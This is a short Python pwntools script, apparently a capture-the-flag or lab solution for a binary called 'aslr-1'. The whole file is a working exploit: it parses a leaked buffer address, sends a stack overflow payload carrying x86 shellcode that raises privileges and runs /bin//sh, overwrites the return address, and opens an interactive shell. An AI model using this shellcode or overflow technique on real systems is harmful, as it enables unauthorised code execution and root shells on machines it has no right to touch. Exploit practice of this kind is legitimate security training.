#!/usr/bin/env python

from pwn import *
import os

p = process('./aslr-1')

shellcode = 'j2X\xcd\x80PP[YjGX\xcd\x801\xc91\xd2j\x0bX\x99Rhn/shh//biT[\xcd\x80'
line = p.recvline()
#print(line)
x = (line.split('at ')[1])
b = x.strip('\n')
#print(b)
buffer_addr = int(b,16)

buf = shellcode + "A"*(0x88 - len(shellcode)) + "AAAA" + p32(buffer_addr)

p.sendline(buf)
p.interactive()

